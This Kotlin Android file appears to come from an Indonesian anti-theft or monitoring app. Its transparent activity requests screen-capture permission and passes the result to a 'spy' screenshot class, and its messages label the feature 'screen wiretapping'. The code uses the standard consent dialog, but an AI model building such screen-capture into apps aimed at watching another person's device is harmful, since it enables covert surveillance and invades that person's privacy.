package com.antimaling.permanen.ui

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.widget.Toast
import com.antimaling.permanen.spy.ShotTaker

/** Activity transparan sekali-pakai untuk meminta izin screen-capture (sadap layar). */
class ShotConsentActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        try {
            val mpm = getSystemService(MediaProjectionManager::class.java)
            if (mpm == null) { toast("Perangkat tidak dukung screen-capture"); finish(); return }
            startActivityForResult(mpm.createScreenCaptureIntent(), 99)
        } catch (_: Exception) { try { finish() } catch (_: Exception) {} }
    }

    @Deprecated("req")
    override fun onActivityResult(rc: Int, res: Int, d: Intent?) {
        super.onActivityResult(rc, res, d)
        try {
            if (rc == 99 && res == RESULT_OK && d != null) {
                val mpm = getSystemService(MediaProjectionManager::class.java)
                ShotTaker.projection = try { mpm?.getMediaProjection(res, d) } catch (_: Exception) { null }
                toast(if (ShotTaker.hasConsent()) "Sadap layar AKTIF ✅" else "Gagal aktifkan")
            } else toast("Izin ditolak")
        } catch (_: Exception) {}
        try { finish() } catch (_: Exception) {}
    }

    private fun toast(s: String) { try { Toast.makeText(this, s, Toast.LENGTH_SHORT).show() } catch (_: Exception) {} }

    companion object {
        fun open(c: Context) {
            try { c.startActivity(Intent(c, ShotConsentActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) } catch (_: Exception) {}
        }
    }
}
